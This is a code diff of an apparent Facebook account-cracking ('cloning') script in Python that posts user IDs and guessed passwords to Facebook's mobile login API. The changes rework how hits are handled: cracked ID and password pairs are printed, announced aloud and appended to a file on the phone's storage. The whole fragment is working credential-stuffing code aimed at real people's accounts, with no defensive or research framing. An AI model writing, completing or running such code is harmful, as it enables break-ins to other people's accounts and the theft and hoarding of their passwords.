@@ -330,24 +330,17 @@ def login1(uid):
             'Content-Length': '706'}
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
-            if "session_key" in rp:
+            if "session_key" in rp:            	
                 oks.append(uid)
-                open("/sdcard/ANAS_CLONING.txt", "a").write(uid + "|" + pw + "\n")
-                print(f'\r\033[38;5;46m[ANAS-OK] {uid} ● {pw}\033[1;97m')
                 break
-
-            # ✅ CP case
-            elif "www.facebook.com" in rp.get('error', {}).get('message', ''):
+            elif "www.facebook.com" in rp['error']['message']:
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mALi\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/ANAS-CLONE-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
-                open("/sdcard/ANAS_CLONING.txt", "a").write(uid + "|" + pw + "\n")
-                print(f'\r\033[38;5;226m[ANAS-CP] {uid} ● {pw}\033[1;97m')
                 break
-
-            else:
-                continue
-        loop += 1
-    except Exception as e:
-        time.sleep(5)
+            else:continue
+        loop+=1
+    except Exception as e:time.sleep(5)
 
 if __name__ == "__main__":
     main()
